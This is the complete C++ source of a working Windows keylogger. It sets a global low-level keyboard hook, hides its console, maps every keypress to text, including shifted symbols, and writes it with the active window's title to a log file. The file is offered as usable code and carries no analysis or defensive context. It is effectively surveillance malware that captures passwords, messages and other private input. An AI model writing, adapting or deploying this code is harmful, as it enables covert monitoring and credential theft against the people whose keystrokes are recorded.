#include <iostream>
#include <Windows.h>
#pragma comment(linker, "/subsystem:windows /entry:wmainCRTStartup")

HHOOK hHook = NULL;
HWND g_hCurrentWND = NULL;
CHAR g_pszWNDTitle[MAX_PATH] = { 0 };
HANDLE g_hFile = INVALID_HANDLE_VALUE;
WCHAR g_pszLogFile[MAX_PATH] = L"keylogger.txt";
CHAR g_fStopFlag[2] = { 0 };

VOID Log(CHAR* pszBuffer) {
    DWORD dwCount = strlen(pszBuffer);
    WriteFile(g_hFile, pszBuffer, dwCount, NULL, NULL);
}

VOID LogWindowChanging(HWND hWND) {
    if (g_hCurrentWND == NULL || hWND != g_hCurrentWND) {
        g_hCurrentWND = hWND;
        memset(g_pszWNDTitle, 0, sizeof g_pszWNDTitle);

        int iCount = GetWindowTextA(hWND, g_pszWNDTitle, sizeof g_pszWNDTitle);
        if (iCount > 0) {
            Log((CHAR*)"\n========================================");
            Log(g_pszWNDTitle);
            Log((CHAR*)"========================================\n");
        }

    }
}

VOID CleanUp() {
    MessageBox(NULL, L"Stop hook", L"!", MB_ICONINFORMATION | MB_SYSTEMMODAL);
    CloseHandle(g_hFile);
    UnhookWindowsHookEx(hHook);
    ExitProcess(0);
}

// https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
VOID LogKeyDown(DWORD dwVKCode, BOOL bShiftDown, BOOL bCapDown, BOOL bNumLockDown) {
    BOOL bUpper = bShiftDown ^ bCapDown;

    if (dwVKCode >= 0x30 && dwVKCode <= 0x39) {
        CHAR pszBuffer[2] = { 0 };
        if (!bShiftDown)
            pszBuffer[0] = (CHAR)dwVKCode;
        else {
            switch (dwVKCode) {
            case 0x30: pszBuffer[0] = ')'; break;
            case 0x31: pszBuffer[0] = '!'; break;
            case 0x32: pszBuffer[0] = '@'; break;
            case 0x33: pszBuffer[0] = '#'; break;
            case 0x34: pszBuffer[0] = '$'; break;
            case 0x35: pszBuffer[0] = '%'; break;
            case 0x36: pszBuffer[0] = '^'; break;
            case 0x37: pszBuffer[0] = '&'; break;
            case 0x38: pszBuffer[0] = '*'; break;
            case 0x39: pszBuffer[0] = '('; break;
            default: break;
            }
        }
        Log(pszBuffer);
    }
    else if (dwVKCode >= 0x41 && dwVKCode <= 0x5A) {
        CHAR pszBuffer[2] = { 0 };
        if (bUpper)
            pszBuffer[0] = (CHAR)dwVKCode;
        else
            pszBuffer[0] = (CHAR)dwVKCode + 'a' - 'A';
        Log(pszBuffer);
    }
    else {
        CHAR pszBuffer[8] = { 0 };
        switch (dwVKCode) {
        case VK_BACK: strcpy_s(pszBuffer, "<BACK>"); break;
        case VK_TAB: strcpy_s(pszBuffer, "<TAB>"); break;
        case VK_RETURN: strcpy_s(pszBuffer, "<ENTER>"); break;
        case VK_ESCAPE: strcpy_s(pszBuffer, "<ESC>"); break;
        case VK_SPACE: strcpy_s(pszBuffer, " "); break;
        case VK_LEFT: strcpy_s(pszBuffer, "<LEFT>"); break;
        case VK_UP: strcpy_s(pszBuffer, "<UP>"); break;
        case VK_RIGHT: strcpy_s(pszBuffer, "<RIGHT>"); break;
        case VK_DOWN: strcpy_s(pszBuffer, "<DOWN>"); break;
        case VK_DELETE: strcpy_s(pszBuffer, "<DEL>"); break;
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL: strcpy_s(pszBuffer, "<CTRL>"); break;

        case VK_NUMPAD0: bNumLockDown ? strcpy_s(pszBuffer, "0") : NULL; break;
        case VK_NUMPAD1: bNumLockDown ? strcpy_s(pszBuffer, "1") : NULL; break;
        case VK_NUMPAD2: bNumLockDown ? strcpy_s(pszBuffer, "2") : NULL; break;
        case VK_NUMPAD3: bNumLockDown ? strcpy_s(pszBuffer, "3") : NULL; break;
        case VK_NUMPAD4: bNumLockDown ? strcpy_s(pszBuffer, "4") : NULL; break;
        case VK_NUMPAD5: bNumLockDown ? strcpy_s(pszBuffer, "5") : NULL; break;
        case VK_NUMPAD6: bNumLockDown ? strcpy_s(pszBuffer, "6") : NULL; break;
        case VK_NUMPAD7: bNumLockDown ? strcpy_s(pszBuffer, "7") : NULL; break;
        case VK_NUMPAD8: bNumLockDown ? strcpy_s(pszBuffer, "8") : NULL; break;
        case VK_NUMPAD9: bNumLockDown ? strcpy_s(pszBuffer, "9") : NULL; break;

        case VK_MULTIPLY: strcpy_s(pszBuffer, "*"); break;
        case VK_ADD: strcpy_s(pszBuffer, "+"); break;
        case VK_SEPARATOR: strcpy_s(pszBuffer, "-"); break;
        case VK_SUBTRACT: strcpy_s(pszBuffer, "-"); break;
        case VK_DECIMAL: strcpy_s(pszBuffer, "."); break;
        case VK_DIVIDE: strcpy_s(pszBuffer, "/"); break;

        case VK_F1: strcpy_s(pszBuffer, "<F1>"); break;
        case VK_F2: strcpy_s(pszBuffer, "<F2>"); break;
        case VK_F3: strcpy_s(pszBuffer, "<F3>"); break;
        case VK_F4: strcpy_s(pszBuffer, "<F4>"); break;
        case VK_F5: strcpy_s(pszBuffer, "<F5>"); break;
        case VK_F6: strcpy_s(pszBuffer, "<F6>"); break;
        case VK_F7: strcpy_s(pszBuffer, "<F7>"); break;
        case VK_F8: strcpy_s(pszBuffer, "<F8>"); break;
        case VK_F9: strcpy_s(pszBuffer, "<F9>"); break;
        case VK_F10: strcpy_s(pszBuffer, "<F10>"); break;
        case VK_F11: strcpy_s(pszBuffer, "<F11>"); break;
        case VK_F12: strcpy_s(pszBuffer, "<F12>"); break;

        case VK_OEM_1: bShiftDown ? strcpy_s(pszBuffer, ":") : strcpy_s(pszBuffer, ";"); break;
        case VK_OEM_PLUS: bShiftDown ? strcpy_s(pszBuffer, "+") : strcpy_s(pszBuffer, "="); break;
        case VK_OEM_COMMA: bShiftDown ? strcpy_s(pszBuffer, "<") : strcpy_s(pszBuffer, ","); break;
        case VK_OEM_MINUS: bShiftDown ? strcpy_s(pszBuffer, "-") : strcpy_s(pszBuffer, "_"); break;
        case VK_OEM_PERIOD: bShiftDown ? strcpy_s(pszBuffer, ">") : strcpy_s(pszBuffer, "."); break;
        case VK_OEM_2: bShiftDown ? strcpy_s(pszBuffer, "?") : strcpy_s(pszBuffer, "/"); break;
        case VK_OEM_3: bShiftDown ? strcpy_s(pszBuffer, "~") : strcpy_s(pszBuffer, "`"); break;
        case VK_OEM_4: bShiftDown ? strcpy_s(pszBuffer, "{") : strcpy_s(pszBuffer, "["); break;
        case VK_OEM_5: bShiftDown ? strcpy_s(pszBuffer, "|") : strcpy_s(pszBuffer, "\\"); break;
        case VK_OEM_6: bShiftDown ? strcpy_s(pszBuffer, "}") : strcpy_s(pszBuffer, "]"); break;
        case VK_OEM_7: bShiftDown ? strcpy_s(pszBuffer, "\"") : strcpy_s(pszBuffer, "'"); break;

        default: break;
        }
        Log(pszBuffer);
    }
}

LRESULT CALLBACK KeyBoardHookProc(int iCode, WPARAM wParam, LPARAM lParam) {
    if (iCode < 0 || wParam != WM_KEYDOWN)
        return CallNextHookEx(NULL, iCode, wParam, lParam);

    KBDLLHOOKSTRUCT* kbhs = (KBDLLHOOKSTRUCT*)lParam;

    // Handle stop signal
    {
        if (kbhs->vkCode == VK_F2) {
            if (g_fStopFlag[0] && g_fStopFlag[1]) {
                // While hiding the window, ctrl event cant be sent
                // GenerateConsoleCtrlEvent(CTRL_C_EVENT, 0);
                CleanUp();
            }
            else {
                if (!g_fStopFlag[0])
                    g_fStopFlag[0] = 1;
                else
                    g_fStopFlag[1] = 1;
            }
        }
        else {
            g_fStopFlag[0] = 0;
            g_fStopFlag[1] = 0;
        }
    }
    /*
        If the high-order bit is 1, the key is down; otherwise, it is up.
        If the low-order bit is 1, the key is toggled. A key,
        such as the CAPS LOCK key, is toggled if it is turned on.
        The key is off and untoggled if the low-order bit is 0.
    */
    BOOL bCapDown = GetKeyState(VK_CAPITAL) & 1;
    BOOL bShiftDown = (USHORT)GetKeyState(VK_LSHIFT) >> 15 || (USHORT)GetKeyState(VK_RSHIFT) >> 15;
    BOOL bNumLockDown = GetKeyState(VK_NUMLOCK) & 1;

    HWND hWND = GetForegroundWindow();
    LogWindowChanging(hWND);

    LogKeyDown(kbhs->vkCode, bShiftDown, bCapDown, bNumLockDown);

    return CallNextHookEx(NULL, iCode, wParam, lParam);
}

BOOL WINAPI CtrlCHandler(DWORD CtrlType) {
    if (CtrlType == CTRL_C_EVENT || CtrlType == CTRL_CLOSE_EVENT || CtrlType == CTRL_SHUTDOWN_EVENT)
        CleanUp();
    return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {
    hHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        KeyBoardHookProc,
        // WH_KEYBOARD_LL hook is global only, 
        // and is called in the context of the thread that installed it
        GetModuleHandle(NULL),
        0
    );
    if (!hHook) {
        MessageBox(NULL, L"Hook fail, exit", L"!", MB_ICONINFORMATION | MB_SYSTEMMODAL);
        return -1;
    }

    WCHAR* pszLogFile = g_pszLogFile;
    if (argc > 1)
        pszLogFile = argv[1];

    g_hFile = CreateFile(
        pszLogFile, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH, NULL
    );
    if (g_hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"%d\n", GetLastError());
        MessageBox(NULL, L"Open file error", L"!", MB_ICONINFORMATION | MB_SYSTEMMODAL);
        return -1;
    }

    MessageBox(NULL, L"Start hook", L"!", MB_ICONINFORMATION | MB_SYSTEMMODAL);

    SetConsoleCtrlHandler(CtrlCHandler, TRUE);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0));
}
